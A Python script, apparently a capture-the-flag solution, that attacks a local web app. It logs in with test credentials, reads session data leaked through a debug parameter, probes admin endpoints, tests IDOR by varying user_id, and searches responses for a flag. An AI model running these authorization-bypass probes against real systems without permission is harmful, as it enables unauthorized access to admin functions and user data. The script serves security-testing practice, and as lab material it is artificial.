import requests
import re
import json

# Base URL
base_url = "http://127.0.0.1:32831"

# Initialize session
session = requests.Session()

print("=" * 80)
print("PHASE 1: Authentication and Session Analysis")
print("=" * 80)

# Login with test:test credentials
login_data = {
    "username": "test",
    "password": "test"
}
print(f"[+] Attempting login with credentials: test:test")
login_resp = session.post(f"{base_url}/login", data=login_data)
print(f"[+] Login response status: {login_resp.status_code}")
if login_resp.status_code in [200, 302]:
    print(f"[+] Session cookie: {session.cookies.get('session')}")
else:
    print(f"[-] Login failed or unexpected response")
    print(f"[-] Response body: {login_resp.text[:500]}")

print("\n" + "=" * 80)
print("PHASE 2: Admin Panel Analysis with Debug Parameter")
print("=" * 80)

# Access /admin_panel?debug=session to extract session structure
print(f"[+] Accessing /admin_panel?debug=session")
admin_resp = session.get(f"{base_url}/admin_panel?debug=session")
print(f"[+] Admin panel response status: {admin_resp.status_code}")
print(f"[+] Admin panel response length: {len(admin_resp.text)} bytes")

# Search for session data in HTML comments
comments = re.findall(r'<!--(.*?)-->', admin_resp.text, re.DOTALL)
print(f"[+] Found {len(comments)} HTML comments")

for i, comment in enumerate(comments):
    comment = comment.strip()
    if comment:
        print(f"\n[+] Comment {i+1}:")
        print(f"{comment[:500]}")
        # Try to parse as JSON if it looks like session data
        if 'username' in comment or 'session_id' in comment or 'user_id' in comment:
            print("[+] Detected potential session data structure!")
            # Look for JSON-like structure
            json_match = re.search(r'\{.*\}', comment, re.DOTALL)
            if json_match:
                try:
                    session_data = json.loads(json_match.group())
                    print(f"[+] Parsed session data:")
                    for key, value in session_data.items():
                        print(f"  - {key}: {value}")
                except:
                    print(f"[+] Could not parse as JSON, raw: {json_match.group()[:200]}")

# Search for admin-related fields in the response
admin_keywords = ['role', 'admin', 'privilege', 'is_admin', 'isAdmin', 'admin_flag']
found_fields = {}

for keyword in admin_keywords:
    if keyword.lower() in admin_resp.text.lower():
        # Find context around the keyword
        pattern = rf'.{{0,30}}{keyword}.{{0,30}}'
        matches = re.findall(pattern, admin_resp.text, re.IGNORECASE)
        if matches:
            found_fields[keyword] = matches[:3]  # Store first 3 matches

print(f"\n[+] Searching for admin-related fields:")
if found_fields:
    for field, contexts in found_fields.items():
        print(f"[+] Field '{field}' found:")
        for context in contexts:
            print(f"  - ...{context}...")
else:
    print("[-] No explicit admin role fields found in response")

print("\n" + "=" * 80)
print("PHASE 3: Testing Common Admin Endpoints")
print("=" * 80)

# Define admin endpoints to test
admin_endpoints = [
    "/admin",
    "/admin/",
    "/admin/users",
    "/admin/settings",
    "/admin/access",
    "/admin/config",
    "/admin/panel"
]

for endpoint in admin_endpoints:
    print(f"\n[+] Testing endpoint: {endpoint}")
    
    # Test without debug parameter
    print(f"  [-] Testing normal access...")
    normal_resp = session.get(f"{base_url}{endpoint}")
    print(f"  [-] Status: {normal_resp.status_code}")
    
    # Test with debug parameter
    print(f"  [-] Testing with ?debug=session...")
    debug_resp = session.get(f"{base_url}{endpoint}?debug=session")
    print(f"  [-] Status: {debug_resp.status_code} | Length: {len(debug_resp.text)}B")
    
    # Check for flag in both responses
    for response_name, response in [("normal", normal_resp), ("debug", debug_resp)]:
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"  [+] FLAG FOUND in {response_name} response: {flags[0]}")
        
        # Also check HTML comments
        response_comments = re.findall(r'<!--(.*?)-->', response.text, re.DOTALL)
        for comment in response_comments:
            flags_in_comment = re.findall(r'FLAG\{[^}]+\}', comment)
            if flags_in_comment:
                print(f"  [+] FLAG FOUND in comment of {response_name} response: {flags_in_comment[0]}")

print("\n" + "=" * 80)
print("PHASE 4: Testing POST Endpoints for Admin Functionality")
print("=" * 80)

# Test /wifi_settings endpoint
test_data = {
    "ssid": "test_ssid",
    "password": "test_password"
}
print(f"[+] Testing /wifi_settings endpoint with admin-like data")
wifi_resp = session.post(f"{base_url}/wifi_settings", data=test_data)
print(f"[+] /wifi_settings response status: {wifi_resp.status_code}")
print(f"[+] Response body: {wifi_resp.text[:300]}")

# Test /wifi_settings with debug parameter
wifi_debug_resp = session.post(f"{base_url}/wifi_settings?debug=session", data=test_data)
print(f"[+] /wifi_settings?debug=session response status: {wifi_debug_resp.status_code}")
print(f"[+] Response body: {wifi_debug_resp.text[:300]}")

# Search for flag in wifi responses
for resp_name, resp in [("wifi_normal", wifi_resp), ("wifi_debug", wifi_debug_resp)]:
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
    if flags:
        print(f"[+] FLAG FOUND in {resp_name} response: {flags[0]}")

print("\n" + "=" * 80)
print("PHASE 5: IDOR Testing - User ID Manipulation")
print("=" * 80)

# Try to extract user_id from session data
print(f"[+] Analyzing session structure for user_id manipulation")

# Test manipulating user_id in session context
# Create a new session to test different user IDs
test_session = requests.Session()
test_session.post(f"{base_url}/login", data=login_data)

# Try accessing resources with different user IDs
session_test_endpoints = [
    f"{base_url}/profile",
    f"{base_url}/user",
    f"{base_url}/account"
]

for endpoint in session_test_endpoints:
    try:
        print(f"\n[+] Testing IDOR on endpoint: {endpoint}")
        base_resp = test_session.get(endpoint)
        print(f"  [-] Base response status: {base_resp.status_code}")
        
        # Try adding user_id parameter
        for user_id in [0, 1, 999, -1]:
            idor_resp = test_session.get(f"{endpoint}?user_id={user_id}")
            if idor_resp.status_code < 400:
                print(f"  [!] User ID {user_id} accessible! Status: {idor_resp.status_code}")
                flags = re.findall(r'FLAG\{[^}]+\}', idor_resp.text)
                if flags:
                    print(f"  [+] FLAG FOUND with user_id={user_id}: {flags[0]}")
    except:
        print(f"  [-] Endpoint {endpoint} not accessible")

print("\n" + "=" * 80)
print("PHASE 6: Comprehensive Flag Search")
print("=" * 80)

# Search all accessible endpoints for flags
all_endpoints = [
    ("GET", "/"),
    ("GET", "/login"),
    ("GET", "/home"),
    ("GET", "/profile"),
    ("GET", "/admin_panel"),
]

print("[+] Searching all endpoints for FLAG{} patterns")
for method, endpoint in all_endpoints:
    try:
        if method == "GET":
            resp = session.get(f"{base_url}{endpoint}")
            resp_debug = session.get(f"{base_url}{endpoint}?debug=session")
        else:
            resp = session.post(f"{base_url}{endpoint}")
            resp_debug = session.post(f"{base_url}{endpoint}?debug=session")
        
        # Check normal response
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"[+] FLAG FOUND at {endpoint}: {flags[0]}")
        
        # Check debug response
        flags_debug = re.findall(r'FLAG\{[^}]+\}', resp_debug.text)
        if flags_debug:
            print(f"[+] FLAG FOUND at {endpoint}?debug=session: {flags_debug[0]}")
        
        # Check comments in debug response
        debug_comments = re.findall(r'<!--(.*?)-->', resp_debug.text, re.DOTALL)
        for comment in debug_comments:
            flags_in_comment = re.findall(r'FLAG\{[^}]+\}', comment)
            if flags_in_comment:
                print(f"[+] FLAG FOUND in debug comment at {endpoint}: {flags_in_comment[0]}")
    except Exception as e:
        print(f"[-] Error accessing {endpoint}: {str(e)[:100]}")

print("\n" + "=" * 80)
print("SUMMARY")
print("=" * 80)
print("[+] Completed comprehensive admin authorization bypass testing")
print("[+] Analyzed session structure through /admin_panel?debug=session")
print("[+] Tested admin endpoints with and without debug parameter")
print("[+] Examined POST endpoints for admin functionality")
print("[+] Conducted IDOR testing on user_id parameters")
print("[+] Comprehensive FLAG{} pattern search performed")
